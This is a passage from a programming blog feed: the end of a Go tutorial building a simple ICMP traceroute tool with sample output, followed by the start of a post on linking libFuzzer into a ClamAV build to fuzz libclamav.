</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">ipv4</span>.<span style="color:#a6e22e">ICMPTypeEchoReply</span>:
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">ok</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">rm</span>.<span style="color:#a6e22e">Body</span>.(<span style="color:#f92672">*</span><span style="color:#a6e22e">icmp</span>.<span style="color:#a6e22e">Echo</span>)
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">ok</span> {
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;not an echo reply&#34;</span>)
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// we skip if the response does not
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#75715e">// come from the target host
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">peer</span>.<span style="color:#a6e22e">String</span>() <span style="color:#f92672">!=</span> <span style="color:#a6e22e">targetHost</span> {
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// store results in a map keyed by thesequence number
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#a6e22e">r</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">Result</span>{
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">IP</span>:            <span style="color:#a6e22e">peer</span>.<span style="color:#a6e22e">String</span>(),
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">HOP</span>:           <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">Seq</span>,
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">TimeElapsedMS</span>: float64(<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>().<span style="color:#a6e22e">UnixNano</span>()<span style="color:#f92672">/</span><span style="color:#ae81ff">1000000</span>) <span style="color:#f92672">-</span> <span style="color:#a6e22e">startTime</span>,
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// store the result
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#a6e22e">results</span>[<span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">Seq</span>] = <span style="color:#a6e22e">r</span>
</span></span><span style="display:flex;"><span>			<span style="color:#f92672">...</span><span style="color:#a6e22e">snipped</span><span style="color:#f92672">...</span>
</span></span></code></pre></div><p>In case of type <code>ipv4.ICMPTypeEchoReply</code> it means that possibly our target host answered us, but we’re not sure yet, since we possibly intercepted a packet coming from an unrelated network event. So, we first cast body of the message to an <code>icmp.Echo</code> type, then we check that the peer from which answer is coming is our target host. If not we just continue looping. In case answer from our target host we create a Result struct and we fill it with the source IP of the packet, the sequence number (more on this later) of the ICMPv4 EchoReply which tells us which HOP was in the route and the elapsed time in milliseconds since we started our program.</p>
<p>In case we receive a <code>ipv4.ICMPTypeTimeExceeded</code> we’ve to do different things:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#a6e22e">ipv4</span>.<span style="color:#a6e22e">ICMPTypeTimeExceeded</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// cast to icmp.TimeExceeded
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">ok</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">rm</span>.<span style="color:#a6e22e">Body</span>.(<span style="color:#f92672">*</span><span style="color:#a6e22e">icmp</span>.<span style="color:#a6e22e">TimeExceeded</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">ok</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;failed to cast to icmp.TimeExceeded&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// icmp.TimeExceeded contains the original packet
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// so we grab IPv4 header and ICMP header
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">ipHdr</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">icmp</span>.<span style="color:#a6e22e">ParseIPv4Header</span>(<span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">Data</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;failed to parse IPv4 header&#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// grab the ICMP header
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">icmpMsg</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">icmp</span>.<span style="color:#a6e22e">ParseMessage</span>(<span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">Data</span>[<span style="color:#a6e22e">ipHdr</span>.<span style="color:#a6e22e">Len</span>:]); <span style="color:#a6e22e">err</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">msg</span>, <span style="color:#a6e22e">ok</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">icmpMsg</span>.<span style="color:#a6e22e">Body</span>.(<span style="color:#f92672">*</span><span style="color:#a6e22e">icmp</span>.<span style="color:#a6e22e">Echo</span>); <span style="color:#a6e22e">ok</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">ID</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">r</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">Result</span>{
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">IP</span>:            <span style="color:#a6e22e">peer</span>.<span style="color:#a6e22e">String</span>(),
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">HOP</span>:           <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">Seq</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">TimeElapsedMS</span>: float64(<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>().<span style="color:#a6e22e">UnixNano</span>()<span style="color:#f92672">/</span><span style="color:#ae81ff">1000000</span>) <span style="color:#f92672">-</span> <span style="color:#a6e22e">startTime</span>,
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">results</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">Seq</span>] = <span style="color:#a6e22e">r</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;failed to parse inner ICMPv4 message&#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>First we cast the body as we did before to the appropriate ICMPv4 message type, in this case <code>icmp.TimeExceeded</code>. What happens then? Well, in case of TimeExceeded the original datagram is appended starting from the ICMPv4 message body. So we’ve an IPv4 header followed by the original ICMPv4 message. We first use a facility offered by the icmp package to parse the IPv4 header, we’ll need its length in order to understand where the ICMPv4 payload starts after it. Then we use again our familiar <code>icmp.ParseMessage</code> function to get the original ICMPv4 message we sent. We check then that we can cast to <code>icmp.Echo</code> and in a positive case, if also the ID matches the one we assigned the original packet, we build a new <code>Result</code> structure filling it with necessary information as we did before.</p>
<p>OK, now we miss last part of the puzzle of this dirty function. We’ve either received a reply from target or we incurred in some timeout because we got no response from it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">...</span><span style="color:#a6e22e">snipped</span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// wait for the timer to expire
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">timer</span>.<span style="color:#a6e22e">C</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// print the results
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#a6e22e">maxTTL</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">ok</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">results</span>[<span style="color:#a6e22e">i</span>]; <span style="color:#a6e22e">ok</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;%d\t%s\t%.2f ms\n&#34;</span>, <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">HOP</span>, <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">IP</span>, <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">TimeElapsedMS</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">IP</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">targetHost</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;%d\t*\n&#34;</span>, <span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Done</span>()
</span></span></code></pre></div><p>In the code snippet above we block waiting for the timer to expire. In the former situation we print a message signaling that timeout has expired and proceed, in the latter we just proceed. The final part is quite trivial. We iterate keys of our <code>map[int]Result</code> starting from the minimum to the maximum TTL (that we equaled to sequence number in our main) and print the results. Since we expect our target host to be the last one in the route, after we match we just stop printing and we signal the main routine we are done.</p>
<p>OK, now before we examine the main routine I’m going to show you a utility function we’re going to use to craft the packet we’re going to send:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">createICMPPacket</span>(<span style="color:#a6e22e">id</span> <span style="color:#66d9ef">int</span>, <span style="color:#a6e22e">seq</span> <span style="color:#66d9ef">int</span>) []<span style="color:#66d9ef">byte</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Create a new ICMP message
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">m</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">icmp</span>.<span style="color:#a6e22e">Message</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Type</span>: <span style="color:#a6e22e">ipv4</span>.<span style="color:#a6e22e">ICMPTypeEcho</span>, <span style="color:#a6e22e">Code</span>: <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Body</span>: <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">icmp</span>.<span style="color:#a6e22e">Echo</span>{
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ID</span>: <span style="color:#a6e22e">id</span>, <span style="color:#a6e22e">Seq</span>: <span style="color:#a6e22e">seq</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Data</span>: []byte(<span style="color:#e6db74">&#34;GO-ROUTE&#34;</span>),
</span></span><span style="display:flex;"><span>		},
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Marshal the message
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">b</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">m</span>.<span style="color:#a6e22e">Marshal</span>(<span style="color:#66d9ef">nil</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">b</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This function is pretty easy to understand, we create an <code>icmp.Message</code> of type <code>ICMPTypeEcho</code> and we assign to it an <code>icmp.Echo</code> body. The function assigns to the body a custom id and a sequence number that we’ll use to track at which position in the route is a host. We then invoke the <code>Marshall</code> method and return a slice of bytes.</p>
<p>Finally our main routine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// create a custom identifier for the packets
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">id</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Getpid</span>() <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// start time in milliseconds
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">startTime</span> <span style="color:#f92672">:=</span> float64(<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>().<span style="color:#a6e22e">UnixNano</span>()) <span style="color:#f92672">/</span> <span style="color:#ae81ff">1000000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">waitResponses</span>(<span style="color:#a6e22e">c</span>, <span style="color:#f92672">*</span><span style="color:#a6e22e">timeout</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">startTime</span>, <span style="color:#a6e22e">remoteHost</span>.<span style="color:#a6e22e">IP</span>.<span style="color:#a6e22e">String</span>(), <span style="color:#f92672">*</span><span style="color:#a6e22e">maxHops</span>, <span style="color:#a6e22e">wg</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">ttl</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">ttl</span> <span style="color:#f92672">&lt;=</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">maxHops</span>; <span style="color:#a6e22e">ttl</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Set the TTL
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">IPv4PacketConn</span>().<span style="color:#a6e22e">SetTTL</span>(<span style="color:#a6e22e">ttl</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;failed to set TTL: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// send N probes for each message
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> &lt; <span style="color:#f92672">*</span><span style="color:#a6e22e">probes</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Create an ICMP packet
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#a6e22e">b</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">createICMPPacket</span>(<span style="color:#a6e22e">id</span>, <span style="color:#a6e22e">ttl</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Send the packet
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">WriteTo</span>(<span style="color:#a6e22e">b</span>, <span style="color:#a6e22e">remoteHost</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;failed to write packet: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Wait</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">```
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">We first register the time we’re starting to send packets and generate a custom ICMPv4 ID for the packets based on our PID, we trim it to 16 bits since it is the maximum size it can fit into the field. Then based on the number of HOPs we want to probe we start iterating on TTL value. For each packet we’re going to send we set the TTL value on the connection, so, from `</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">` to `</span><span style="color:#a6e22e">maxHops</span><span style="color:#e6db74">`. Then after TTL has being set we send a certain number of probes (specified from the command line) for each of its values, notice here how we use our `</span><span style="color:#a6e22e">createICMPPacket</span><span style="color:#e6db74">` function. The value of the sequence ID for each packet is equalized to the current TTL value we’re probing, finally we write the packet on the “wire”.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Lets try it:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">```</span><span style="color:#a6e22e">bash</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">sudo</span> .<span style="color:#f92672">/</span><span style="color:#a6e22e">goroute</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">host</span> <span style="color:#a6e22e">google</span>.<span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">traceroute</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">google</span>.<span style="color:#a6e22e">com</span> (<span style="color:#ae81ff">216.58.209.46</span>), <span style="color:#ae81ff">30</span> <span style="color:#a6e22e">hops</span> <span style="color:#a6e22e">max</span>, <span style="color:#a6e22e">timeout</span> <span style="color:#ae81ff">2</span><span style="color:#a6e22e">s</span>, <span style="color:#a6e22e">start</span> <span style="color:#a6e22e">time</span> <span style="color:#ae81ff">2022</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#f92672">-</span><span style="color:#ae81ff">07</span><span style="color:#a6e22e">T13</span>:<span style="color:#ae81ff">52</span>:<span style="color:#ae81ff">12</span><span style="color:#f92672">+</span><span style="color:#ae81ff">02</span>:<span style="color:#ae81ff">00</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>	<span style="color:#ae81ff">192.168.1.1</span>	<span style="color:#ae81ff">4.19</span> <span style="color:#a6e22e">ms</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>	<span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span>	<span style="color:#ae81ff">172.18.1.254</span>	<span style="color:#ae81ff">10.19</span> <span style="color:#a6e22e">ms</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span>	<span style="color:#ae81ff">172.18.0.72</span>	<span style="color:#ae81ff">10.19</span> <span style="color:#a6e22e">ms</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span>	<span style="color:#ae81ff">172.19.184.160</span>	<span style="color:#ae81ff">16.19</span> <span style="color:#a6e22e">ms</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>	<span style="color:#ae81ff">172.19.177.40</span>	<span style="color:#ae81ff">18.19</span> <span style="color:#a6e22e">ms</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7</span>	<span style="color:#ae81ff">172.19.177.8</span>	<span style="color:#ae81ff">33.19</span> <span style="color:#a6e22e">ms</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">8</span>	<span style="color:#ae81ff">195.22.192.144</span>	<span style="color:#ae81ff">35.19</span> <span style="color:#a6e22e">ms</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">9</span>	<span style="color:#ae81ff">72.14.198.6</span>	<span style="color:#ae81ff">31.19</span> <span style="color:#a6e22e">ms</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">10</span>	<span style="color:#ae81ff">209.85.254.219</span>	<span style="color:#ae81ff">33.19</span> <span style="color:#a6e22e">ms</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">11</span>	<span style="color:#ae81ff">108.170.232.181</span>	<span style="color:#ae81ff">36.19</span> <span style="color:#a6e22e">ms</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">12</span>	<span style="color:#ae81ff">216.58.209.46</span>	<span style="color:#ae81ff">35.19</span> <span style="color:#a6e22e">ms</span>
</span></span></code></pre></div><p>OK, now lets see how the original traceroute behaves:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo traceroute -I google.com -n
</span></span><span style="display:flex;"><span>traceroute to google.com <span style="color:#f92672">(</span>216.58.209.46<span style="color:#f92672">)</span>, <span style="color:#ae81ff">30</span> hops max, <span style="color:#ae81ff">60</span> byte packets
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1</span>  192.168.1.1  1.228 ms  3.508 ms  3.504 ms
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2</span>  * * *
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">3</span>  172.18.1.254  7.655 ms  12.169 ms  12.166 ms
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">4</span>  172.18.0.72  9.643 ms  9.640 ms  9.637 ms
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">5</span>  172.19.184.160  13.877 ms  15.833 ms  15.830 ms
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">6</span>  172.19.177.40  17.888 ms  16.643 ms  16.426 ms
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">7</span>  172.19.177.8  29.721 ms  31.447 ms  31.429 ms
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">8</span>  195.22.192.144  29.406 ms  29.403 ms  28.994 ms
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">9</span>  72.14.198.6  24.729 ms  25.241 ms  25.318 ms
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">10</span>  209.85.254.219  26.997 ms  27.152 ms  27.147 ms
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">11</span>  108.170.232.181  30.354 ms  29.948 ms  30.173 ms
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">12</span>  216.58.209.46  30.301 ms  30.295 ms  30.293 ms
</span></span></code></pre></div><p>Awesome! We did not miss any host! That’s great!</p>
<p>In conclusion this article just demonstrated how to write a simple traceroute tool in Go. Of course readers are encouraged to check the original <a href="https://man7.org/linux/man-pages/man8/traceroute.8.html">traceroute(8)</a> – Linux manual page and explore further. What we did here is a very simple and naive version and the original tool has really tons of optimization and mode of operations. For example we used ICMPv4 packets to probe. But the original traceroute program is able to use half-open TCP connections and UDP connections too.</p>
]]></content>
        </item>
        
        <item>
            <title>Build a simple fuzzer with libFuzzer</title>
            <link>https://example.org/posts/02-libfuzzer/</link>
            <pubDate>Thu, 17 Feb 2022 14:55:03 +0200</pubDate>
            
            <guid>https://example.org/posts/02-libfuzzer/</guid>
            <description>libFuzzer is coverage-guided, evolutionary fuzzing engine. And it’s a wonderful tool to help with bug hunting.
To quote the libFuzzer page:
LibFuzzer is linked with the library under test, and feeds fuzzed inputs to the library via a specific fuzzing entrypoint (aka “target function”); the fuzzer then tracks which areas of the code are reached, and generates mutations on the corpus of input data in order to maximize the code coverage.</description>
            <content type="html"><![CDATA[<p>libFuzzer is coverage-guided, evolutionary fuzzing engine. And it’s a wonderful tool to help with bug hunting.</p>
<p>To quote the libFuzzer page:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>LibFuzzer is linked with the library under test, and feeds fuzzed inputs to the library via a specific fuzzing entrypoint (aka “target function”); the fuzzer then tracks which areas of the code are reached, and generates mutations on the corpus of input data in order to maximize the code coverage. The code coverage information for libFuzzer is provided by LLVM’s SanitizerCoverage instrumentation.
</span></span></code></pre></div><p>So basically once it gets linked with your library it provides an easy way to feed mutated input to a target function at each iteration and the mutation is done in a way that tries to maximize the code coverage. All clear.</p>
<p>What we want to accomplish here is to write a simple fuzzer for libclamav, the library at the core of ClamAV antivirus.</p>
<p>So the first step is understanding how we’re going to link libFuzzer to libclamav when building ClamAV and its components.</p>
<p>To quote libFuzzer documentation:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>If modifying CFLAGS of a large project, which also compiles executables requiring their own main symbol, it may be desirable to request just the instrumentation without linking:
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>clang -fsanitize<span style="color:#f92672">=</span>fuzzer-no-link mytarget.c
</span></span></code></pre></div><p>And this is exactly our case.</p>
<p>So these are the steps:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1. tar zxvf clamav-0.104.2.tar.gz <span style="color:#f92672">&amp;&amp;</span> cd clamav-0.104.2
</span></span><span style="display:flex;"><span>2. mkdir build <span style="color:#f92672">&amp;&amp;</span> build
</span></span><span style="display:flex;"><span>3. CC<span style="color:#f92672">=</span>clang CXX<span style="color:#f92672">=</span>clang++ CFLAGS<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;-fsanitize=fuzzer-no-link,address&#34;</span> cmake ../
</span></span><span style="display:flex;"><span>4. cmake --build .
